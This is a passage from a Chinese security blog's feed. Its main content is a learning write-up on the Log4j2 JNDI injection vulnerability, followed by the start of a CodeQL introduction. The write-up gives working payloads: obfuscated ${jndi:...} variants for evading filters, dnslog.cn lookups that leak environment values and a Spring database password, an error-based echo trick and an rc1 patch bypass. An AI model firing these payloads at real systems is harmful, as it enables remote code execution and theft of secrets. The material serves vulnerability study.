参考文章"></a>0x04 参考文章</h2><p><a href="https://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#JSON%E5%8A%AB%E6%8C%81">https://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#JSON%E5%8A%AB%E6%8C%81</a></p><p><a href="https://www.freebuf.com/articles/web/194698.html">https://www.freebuf.com/articles/web/194698.html</a></p><p>《推开xray之门》</p>]]></content>
    
    
    <summary type="html">对jsonp学习的一些描述记录</summary>
    
    
    
    <category term="漏洞" scheme="https://h0ld1rs.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="漏洞" scheme="https://h0ld1rs.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2分析入门</title>
    <link href="https://h0ld1rs.github.io/posts/51438.html"/>
    <id>https://h0ld1rs.github.io/posts/51438.html</id>
    <published>2022-03-18T03:36:55.000Z</published>
    <updated>2022-03-23T14:18:40.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="log4j2-RCE入门"><a href="#log4j2-RCE入门" class="headerlink" title="log4j2 RCE入门"></a>log4j2 RCE入门</h1><p>首先需要了解一下log4j的依赖包，使用jar包暂且不说，如果是maven项目导入的话，需要导入两个包</p><p><code>log4j</code>和<code>log4j-api</code></p><blockquote><p>log4j 包含.class<br>log4j-api 包含.class但是只是一堆接口而已，实际使用需要log4j<br>log4j-core 包含.class与.java也就是源码</p></blockquote><p>两者缺一不可，其他的东西可以自己去了解一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>我们先看代码</p><p>这里使用的版本是 jdk8u181</p><p>首先，需要开启ldap服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8000/#Exp</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jRce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger= LogManager.getLogger(log4jRce.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;jndi:ldap://127.0.0.1:1389/Exp&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">55</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">221</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1110</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1033</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">344</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">540</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">498</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">481</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">456</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">63</span>, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2205</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2159</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2142</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2017</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1983</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">740</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:<span class="number">7</span>, log4jRce</span><br></pre></td></tr></table></figure><h2 id="变种-payload"><a href="#变种-payload" class="headerlink" title="变种 payload"></a>变种 payload</h2><p>会对<code>payload</code>进行一个递归的处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:<span class="comment">//127.0.0.1:1099/ass&#125;</span></span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:<span class="comment">//127.0.0.1:1099/ass&#125;</span></span><br><span class="line">$&#123;jndi:rmi:<span class="comment">//adsasd.asdasd.asdasd&#125;</span></span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;:<span class="comment">//adsasd.asdasd.asdasd/poc&#125;</span></span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;:<span class="comment">//adsasd.asdasd.asdasd/poc&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;:<span class="comment">//adsasd.asdasd.asdasd/poc&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;:<span class="comment">//xxxxxxx.xx/poc&#125;</span></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>ElasticSearch</code>利用<code>Java</code>的<code>SecurityManager</code>安全机制来防御文件操作和<code>Socket</code>操作，所以无法正常连接远程服务器</p><p>这种不能<code>RCE</code>的情况也说明了，研究<code>log4j2非RCE</code>的必要性，看看是否能信息泄露</p><p>解决：</p><ul><li>获取：利用<code>$&#123;&#125;</code>和其他各种<code>Lookup</code></li><li>带出：利用<code>dnslog</code>或直接<code>dns</code>协议</li></ul><h3 id="1-嵌套标签"><a href="#1-嵌套标签" class="headerlink" title="1. 嵌套标签"></a>1. 嵌套标签</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//$&#123;java:version&#125;.u2xf5m.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p><code>Log4j2</code>是在<code>substitute</code>方法中递归解析<code>$&#123;&#125;</code>表达式，所以可以利用这种嵌套标签，从内到外获取<code>$&#123;&#125;</code>中的内容，然后分配给对应的<code>Lookup</code>做解析，获得信息后通过<code>Dnslog</code>带出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jRce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger= LogManager.getLogger(log4jRce.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://$&#123;env:OS&#125;.12qtuf.dnslog.cn&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\12451\AppData\Roaming\Typora\typora-user-images\image-20220317171103439.png" alt="image-20220317171103439"></p><p>在其中试一些 payload 的时候：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//$&#123;java:version&#125;.u2xf5m.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p>是无法执行通的，这里不知道是为什么，希望一些师傅能解答</p><h3 id="2-Sys与Env"><a href="#2-Sys与Env" class="headerlink" title="2.Sys与Env"></a>2.Sys与Env</h3><p>信息来自于<code>System.getProperty()</code>和<code>System.getenv()</code></p><p>参考这个师傅的：<a href="https://github.com/jas502n/Log4j2-CVE-2021-44228">https://github.com/jas502n/Log4j2-CVE-2021-44228</a></p><p>师傅针对不同版本做出了一些例子</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220317171452.png"></p><h3 id="3-Bundle"><a href="#3-Bundle" class="headerlink" title="3. Bundle"></a>3. Bundle</h3><p>在浅蓝师傅的文章中提到的一种特殊<code>Lookup</code></p><p>源码的<code>BundleLookup</code>核心内容如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String key)</span> &#123;    ...    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">bundleName</span> <span class="operator">=</span> keys[<span class="number">0</span>];    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">bundleKey</span> <span class="operator">=</span> keys[<span class="number">1</span>];    ...    <span class="keyword">return</span> ResourceBundle.getBundle(bundleName).getString(bundleKey);&#125;</span><br></pre></td></tr></table></figure><p>在通常情况下这个<code>ResourceBundle</code>被用来做国际化，网站通常会给一段表述的内容翻译成多种语言</p><p>在<code>SpringBoot</code>下可能会获取到关键信息，将会比<code>Sys</code>和<code>Env</code>更严重</p><p>但这种情况略显鸡肋，需要手动排除<code>SpringBoot</code>自带的日志依赖并加入<code>Log4j2</code>的依赖（这种情况可能不多）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;    &lt;exclusions&gt;        &lt;exclusion&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;        &lt;/exclusion&gt;    &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>通过<code>$&#123;bundle:application:spring.datasource.password&#125;</code>可以直接拿到数据库密码，之后带入<code>DNSlog</code>，也可以使用</p><h3 id="4-DNS"><a href="#4-DNS" class="headerlink" title="4. DNS"></a>4. <code>DNS</code></h3><p><code>DNS</code>协议是属于<code>JNDI</code>协议的，所以我们也可以利用<code>DNS</code>协议来带一些信息</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220317172023.png"></p><p>编写测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;<span class="keyword">import</span> org.apache.logging.log4j.Logger;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jRce</span> &#123;    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger= LogManager.getLogger(log4jRce.class);    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        logger.error(<span class="string">&quot;$&#123;jndi:dns://127.0.0.1:8888/$&#123;java:version&#125;&#125;&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><p>之后，使用 <code>nc -luvp</code>开启一个监听的端口</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220317172551.png"></p><h3 id="5-不出网回显"><a href="#5-不出网回显" class="headerlink" title="5. 不出网回显"></a>5. 不出网回显</h3><p>在<code>log4j</code>整体流程下有这么一部</p><p>在<code>tryCallAppender</code>方法中<code>catch</code>了<code>RuntimeException</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">tryCallAppender</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;    <span class="keyword">try</span> &#123;        appender.append(event);    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> RuntimeException error) &#123;        handleAppenderError(event, error);    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception error) &#123;        handleAppenderError(event, <span class="keyword">new</span> <span class="title class_">AppenderLoggingException</span>(error));    &#125;&#125;</span><br></pre></td></tr></table></figure><p>如果配置了<code>ignoreExceptions</code>选项，就会直接抛出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleAppenderError</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> RuntimeException ex)</span> &#123;    appender.getHandler().error(createErrorMsg(<span class="string">&quot;An exception occurred processing Appender &quot;</span>), event, ex);    <span class="keyword">if</span> (!appender.ignoreExceptions()) &#123;        <span class="keyword">throw</span> ex;    &#125;&#125;</span><br></pre></td></tr></table></figure><p>接下来，我们就要想办法去制造一个<code>RuntimeException</code></p><p>例如字符串转数字中有一个<code>NumberFormatException</code>异常，它父类的父类是<code>RuntimeException</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NumberFormatException</span> <span class="keyword">extends</span> <span class="title class_">IllegalArgumentException</span> &#123;&#125;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IllegalArgumentException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p><code>JndiManager.lookup</code>中name是<code>protocal://host:port/path</code></p><p>其中<code>port</code>本该是<code>int</code>如果给它无法转<code>int</code>的字符串就会抛出这里的信息</p><p>又联想到<code>$&#123;&#125;</code>是支持嵌套标签的，这里嵌入真正想要得到的结果，即可抛出执行结果</p><p>根据这个思路，成功在<code>Tomcat</code>项目中回显执行结果（例如这里的<code>$&#123;java:version&#125;</code>）</p><p>能够回显的Payload是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//x.x.x.x:$&#123;java:version&#125;/xxx&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220317182730.png"></p><p>浅蓝师傅的思路是来自于端口字符串强转<code>int</code>报错来回显</p><p>在<code>log4j2.xml</code>中开启配置：<code>ignoreExceptions=&quot;false&quot;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;warn&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MyApp&quot;</span> <span class="attr">packages</span>=<span class="string">&quot;&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span>        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> <span class="attr">ignoreExceptions</span>=<span class="string">&quot;false&quot;</span>&gt;</span>            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%m%n&quot;</span>/&gt;</span>        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span>    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span>    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span>        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span>            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span>/&gt;</span>        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span>    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在实际的环境中，有开启这个配置的概率，参考<code>apache</code>官方的描述</p><p>大致意思是在<code>FailoverAppender</code>情况下必须设置该选项为<code>false</code></p><p>某些情况下开发者想让错误报出来便于调试，也会故意开启这个选项</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ignoreExceptions:The <span class="keyword">default</span> is <span class="literal">true</span>, causing exceptions encountered <span class="keyword">while</span> appending events to be internally logged and then ignored. When set to <span class="literal">false</span> exceptions will be propagated to the caller, instead. You must set <span class="built_in">this</span> to <span class="literal">false</span> when wrapping <span class="built_in">this</span> Appender in a FailoverAppender.</span><br></pre></td></tr></table></figure><p>再<code>Tomcat</code>中使用<code>Log4j2</code>的配置文件需要修改<code>web.xml</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;listener&gt;    &lt;listener-class&gt;org.apache.logging.log4j.web.Log4jServletContextListener&lt;/listener-class&gt;&lt;/listener&gt;&lt;filter&gt;    &lt;filter-name&gt;log4jServletFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.apache.logging.log4j.web.Log4jServletFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;context-param&gt;    &lt;param-name&gt;log4jConfiguration&lt;/param-name&gt;    &lt;param-value&gt;file:<span class="comment">///YOUR_LOG4J2.XML_PATH&lt;/param-value&gt;&lt;/context-param&gt;&lt;filter-mapping&gt;    &lt;filter-name&gt;log4jServletFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;    &lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt;    &lt;dispatcher&gt;FORWARD&lt;/dispatcher&gt;    &lt;dispatcher&gt;INCLUDE&lt;/dispatcher&gt;    &lt;dispatcher&gt;ERROR&lt;/dispatcher&gt;    &lt;dispatcher&gt;ASYNC&lt;/dispatcher&gt;&lt;/filter-mapping&gt;</span></span><br></pre></td></tr></table></figure><p>来个<code>Servlet</code>即可触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();    <span class="meta">@Override</span>    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:$&#123;java:runtime&#125;/badClassName&#125;&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="RC1-修复绕过"><a href="#RC1-修复绕过" class="headerlink" title="RC1 修复绕过"></a>RC1 修复绕过</h2><p>修复版本<code>2.15.0-rc1</code></p><p>官方发布了补丁，就说是可以被绕过了，但是经过师傅们得分析，实际还是需要开启一些配置才能算绕过得</p><p>默认配置下是不能触发JNDI远程加载的，单就这个条件来说我觉得就很勉强了，但是确实更改了配置后就可以触发漏洞，</p><p>这里先鸽一下：说一下思路：</p><p>过滤了<code>RMI</code>，但是<code>LDAP</code>方式还是保留得</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//xxx.xxx.xxx.xxx:xxxx/ ExportObject&#125;</span></span><br></pre></td></tr></table></figure><p>在url中“&#x2F;”后加上一个空格，就会导致lookup方法中一开始实例化URI对象的时候报错，这样不仅可以绕过第二道校验，连第一个针对host的校验也可以绕过，从而再次造成RCE。在rc2中，catch错误之后，return null，也就走不到lookup方法里了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/10659">https://xz.aliyun.com/t/10659</a></p><p><a href="https://xz.aliyun.com/t/10649">https://xz.aliyun.com/t/10649</a></p><p><a href="https://www.anquanke.com/post/id/263325#h2-5">https://www.anquanke.com/post/id/263325#h2-5</a></p><p><a href="https://tttang.com/archive/1378/">https://tttang.com/archive/1378/</a></p>]]></content>
    
    
    <summary type="html">对学习log4j2当时得一些总结</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="https://h0ld1rs.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>codeql入门</title>
    <link href="https://h0ld1rs.github.io/posts/7090.html"/>
    <id>https://h0ld1rs.github.io/posts/7090.html</id>
    <published>2022-03-14T03:11:58.000Z</published>
    <updated>2022-03-25T13:58:31.387Z</updated>
    
    <content type="html"><![CDATA[<h1 id="codeql入门"><a href="#codeql入门" class="headerlink" title="codeql入门"></a>codeql入门</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最初接触codeql，是暑假公司师傅们提到了一下，当时在公司宿舍聊天，聊到各位师傅当时的面试题，，有一个师傅被问了AST语法树分析，，，</p><p>然后一脸懵逼的我听着师傅的讲解，谈到了2021 强网杯 那道几十万行的pop链，瞬间知道他是干啥的，，，</p><p>主要用于<code>污点追踪分析</code></p><p><img src="https://pic4.zhimg.com/80/v2-96aeb9524104f7c9abdcd4718f5759bb_720w.jpg" alt="img"></p><h2 id="Codeql基本概念"><a href="#Codeql基本概念" class="headerlink" title="Codeql基本概念"></a>Codeql基本概念</h2><h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p>CodeQL是一个代码分析平台，在它的帮助下，安全研究人员可以利用已知的安全漏洞来挖掘类似的漏洞，可以实现变种分析的自动化。这里所谓的变种分析，就是以已知的安全漏洞作为参照物，在我们的目标代码中寻找类似的安全问题的过程。</p><h3 id="漏洞挖掘范式"><a href="#漏洞挖掘范式" class="headerlink" title="漏洞挖掘范式"></a>漏洞挖掘范式</h3><p>我们知道，挖掘漏洞的时候，对于大佬来说，其实是可以硬审的，但是，对安全人员要求比较高，换句话说，对新手不太友好，</p><p>那么，我们就可以照猫画虎去模仿的写一个类似的，去分析上面题到的变种类型。</p><h2 id="QL"><a href="#QL" class="headerlink" title="QL"></a>QL</h2><p>QL是一种通用的、面向对象的语言，可以用来查询任何类型的数据。在CodeQL平台上面，为了帮助安全研究人员完成各种代码分析工作，提供了许多现成的查询和代码库——这些都是使用QL语言编写的，</p><p>并且，它们都是开源的，源码可以从这里（<a href="https://github.com/semmle/ql%EF%BC%89%E4%B8%8B%E8%BD%BD%E3%80%82">https://github.com/semmle/ql）下载。</a></p><p>我们可以使用<code>mysql</code>去对比<code>codeql</code></p><ul><li>MySQL是一个数据库管理系统，可以用来存储、管理和分析数据；而CodeQL则可以看作是一个代码库管理系统，用于存储、管理和分析代码。</li><li>为了分析数据，我们需要SQL语言来查询数据库；而为了分析代码，这里则需要利用QL语言来查询代码库。</li></ul><p>&#x3D;&#x3D;CodeQL数据库中存放的是使用CodeQL创建和分析的关系数据。 我们可以将其看作是QL的快照，但是针对CodeQL工具进行了相应的优化处理。&#x3D;&#x3D;</p><h2 id="codeql的安装"><a href="#codeql的安装" class="headerlink" 